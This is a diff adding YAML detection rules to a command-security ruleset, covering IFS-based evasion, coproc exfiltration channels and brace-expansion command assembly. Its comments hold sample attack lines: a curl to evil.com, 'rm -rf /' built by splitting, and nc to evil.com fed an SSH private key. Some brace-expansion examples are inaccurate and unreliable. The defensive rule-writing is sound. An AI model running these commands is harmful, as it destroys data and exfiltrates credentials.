@@ -2428,3 +2428,153 @@ rules:
     decision: "AUDIT"
     confidence: 0.85
     reason: "find -exec with a network tool detected — could be used to exfiltrate matched files. While some legitimate uses exist (e.g., uploading build artifacts), the combination of file discovery with network egress warrants review. MITRE T1048."
+
+  # =========================================================================
+  # IFS Manipulation for Command Evasion
+  # =========================================================================
+  #
+  # The Internal Field Separator (IFS) controls how bash splits words.
+  # Attackers can manipulate IFS to:
+  #   1. Construct commands from strings that don't match regex patterns:
+  #      IFS=/; cmd="usr/bin/curl http://evil.com/payload"; $cmd
+  #   2. Split PATH-like strings into executable + args:
+  #      IFS=.; x="rm.-rf./"; set -- $x; "$@"
+  #   3. Bypass word-boundary detection by changing field separators
+  #   4. Combine with eval to reassemble obfuscated commands
+  #
+  # Key insight: modifying IFS before variable expansion or eval changes
+  # how the shell interprets every subsequent unquoted variable reference.
+  # This is a fundamental shell mechanism that most security tools ignore.
+  #
+  # Safe IFS usage: resetting IFS (unset IFS, IFS=$' \t\n') or using IFS
+  # in read loops (IFS=, read -r line) are legitimate patterns.
+  # =========================================================================
+
+  # --- BLOCK: IFS set to non-standard value followed by eval/exec ---
+  - id: "ts-block-ifs-eval-evasion"
+    taxonomy: "unauthorized-execution/remote-code-exec/indirect-code-exec"
+    match:
+      command_regex: "\\bIFS=[^$\\s'\"\\\\tn][^;]*;.*\\b(eval|exec)\\b"
+    decision: "BLOCK"
+    confidence: 0.90
+    reason: "IFS manipulation followed by eval/exec — attacker changes how bash splits words to construct commands from obfuscated strings. The non-standard IFS causes seemingly innocent variable values to be split into executable + arguments. MITRE T1027.004."
+
+  # --- BLOCK: IFS set then positional parameters or bare variable execution ---
+  - id: "ts-block-ifs-positional-evasion"
+    taxonomy: "unauthorized-execution/remote-code-exec/indirect-code-exec"
+    match:
+      command_regex: "\\bIFS=[^$\\s'\"\\\\tn][^;]*;.*(set\\s+--|\"\\$@\"|\\$@|\\$\\*|;\\s*\\$\\{?[a-zA-Z_])"
+    decision: "BLOCK"
+    confidence: 0.88
+    reason: "IFS manipulation with positional parameter expansion (set --, $@, $*) or bare variable execution — splits a string by a custom delimiter and re-assembles it as command arguments. Classic shell obfuscation technique: IFS=.; x='rm.-rf./'; set -- $x; \"$@\" executes 'rm -rf /'. MITRE T1027.004."
+
+  # --- AUDIT: Any IFS set to non-whitespace value (broad catch) ---
+  - id: "ts-audit-ifs-manipulation"
+    taxonomy: "unauthorized-execution/remote-code-exec/indirect-code-exec"
+    match:
+      command_regex: "\\bIFS=[^$\\s'\"\\\\tn]"
+    decision: "AUDIT"
+    confidence: 0.70
+    reason: "IFS set to a non-whitespace value — while sometimes legitimate (e.g., CSV parsing), this changes fundamental shell word splitting and may be used to evade command detection. MITRE T1027.004."
+
+  # =========================================================================
+  # Coproc Stealth Exfiltration Channels
+  # =========================================================================
+  #
+  # bash coproc creates a bidirectional coprocess with two file descriptors:
+  #   ${COPROC[0]} — read from coprocess stdout
+  #   ${COPROC[1]} — write to coprocess stdin
+  #
+  # Unlike pipes (cmd1 | cmd2), coproc channels persist across commands
+  # and the connection to the network tool is established BEFORE any data
+  # is sent. This means:
+  #   1. The network connection and data flow happen in separate commands
+  #   2. No visible pipe character connects data source to network sink
+  #   3. The coprocess runs in the background, making it harder to detect
+  #   4. Data can be written to the channel much later, even from different
+  #      subshells or functions
+  #
+  # Example attack:
+  #   coproc nc evil.com 4444
+  #   cat ~/.ssh/id_rsa >&${COPROC[1]}
+  #   # Or worse: the second command is in a different script/function
+  #
+  # This is strictly more evasive than pipe-based exfiltration because
+  # no single command contains both the data source and network sink.
+  # =========================================================================
+
+  # --- BLOCK: coproc with network tools (establishes stealth channel) ---
+  - id: "ts-block-coproc-network"
+    taxonomy: "data-exfiltration/network-egress/reverse-shell"
+    match:
+      command_regex: "\\bcoproc\\b[^;|&]*(nc|ncat|socat|curl|wget|telnet|openssl\\s+s_client|bash\\s+-i|ssh|netcat)\\b"
+    decision: "BLOCK"
+    confidence: 0.95
+    reason: "coproc with a network tool creates a persistent bidirectional channel that evades pipe-based detection. Unlike 'cmd | nc', the coproc channel persists across commands — data can be fed to it later without any visible pipe, making exfiltration chains invisible to single-command analysis. MITRE T1048."
+
+  # --- BLOCK: writing to COPROC file descriptor (data feed to stealth channel) ---
+  - id: "ts-block-coproc-fd-write"
+    taxonomy: "data-exfiltration/network-egress/reverse-shell"
+    match:
+      command_regex: ">&\\$\\{?COPROC\\[?1\\]?\\}?|>\\s*/dev/fd/.*COPROC|\\|\\s*tee\\s+.*COPROC"
+    decision: "BLOCK"
+    confidence: 0.93
+    reason: "Writing to a COPROC file descriptor (${COPROC[1]}) sends data to whatever coprocess is running — typically a network tool for exfiltration. This is the data-feeding half of a coproc-based stealth channel. MITRE T1048."
+
+  # --- AUDIT: any coproc usage (unusual in normal development) ---
+  - id: "ts-audit-coproc"
+    taxonomy: "data-exfiltration/network-egress/reverse-shell"
+    match:
+      command_regex: "\\bcoproc\\b"
+    decision: "AUDIT"
+    confidence: 0.65
+    reason: "coproc (coprocess) usage detected. While legitimate uses exist (parallel processing, interactive tool wrappers), coproc is rarely used in normal development and can establish stealth bidirectional channels. MITRE T1048."
+
+  # =========================================================================
+  # Brace Expansion Command Construction
+  # =========================================================================
+  #
+  # Bash brace expansion ({a,b}) generates multiple strings before any
+  # other expansion. Attackers combine this with eval to construct
+  # dangerous commands from innocent-looking fragments:
+  #
+  #   eval {r,m}' '{-,}rf' '/       → eval rm -rf /
+  #   eval /usr/bin/{c,u,r,l}       → eval /usr/bin/curl (not exactly, but conceptually)
+  #   eval {/,b,i,n,/,b,a,s,h}     → eval /bin/bash (brace per char)
+  #   $(echo {r,m})                 → rm (via command substitution)
+  #   eval {cu,rl}' 'evil.com       → eval curl evil.com
+  #
+  # The key insight is that brace expansion happens BEFORE command
+  # recognition, so 'eval {r,m}' doesn't contain 'rm' in the literal
+  # command string — the shell assembles it at expansion time.
+  #
+  # This is distinct from globbing (* ? []) which matches existing files.
+  # Brace expansion generates arbitrary strings regardless of filesystem.
+  # =========================================================================
+
+  # --- BLOCK: eval with brace expansion (command assembly from fragments) ---
+  - id: "ts-block-eval-brace-expansion"
+    taxonomy: "unauthorized-execution/remote-code-exec/indirect-code-exec"
+    match:
+      command_regex: "(eval|exec)\\s+.*\\{[^}]*,[^}]*\\}"
+    decision: "BLOCK"
+    confidence: 0.92
+    reason: "eval/exec with brace expansion assembles commands from fragments at shell expansion time — the literal command string never contains the final dangerous command, evading regex-based detection. Example: 'eval {r,m} -rf /' assembles 'rm -rf /'. MITRE T1027.004."
+
+  # --- BLOCK: command substitution with brace expansion fed to eval ---
+  - id: "ts-block-cmdsub-brace-eval"
+    taxonomy: "unauthorized-execution/remote-code-exec/indirect-code-exec"
+    match:
+      command_regex: "(eval|exec|\\$\\().*echo\\s+.*\\{[^}]*,[^}]*\\}"
+    decision: "BLOCK"
+    confidence: 0.90
+    reason: "echo with brace expansion inside command substitution or eval constructs command names from fragments — $(echo {r,m}) produces 'rm'. Combines two layers of indirection to evade detection. MITRE T1027.004."
+
+  # --- BLOCK: brace expansion assigned to variable then executed ---
+  - id: "ts-block-brace-var-exec"
+    taxonomy: "unauthorized-execution/remote-code-exec/indirect-code-exec"
+    match:
+      command_regex: "[a-zA-Z_][a-zA-Z0-9_]*=.*\\{[^}]*,[^}]*\\}[^;|&]*;[^;|&]*(eval|\\$\\{?[a-zA-Z_]|\"\\$)"
+    decision: "BLOCK"
+    confidence: 0.88
+    reason: "Brace expansion result stored in a variable and then executed — two-stage command construction that first assembles the payload, then runs it. Evades single-pass detection. MITRE T1027.004."
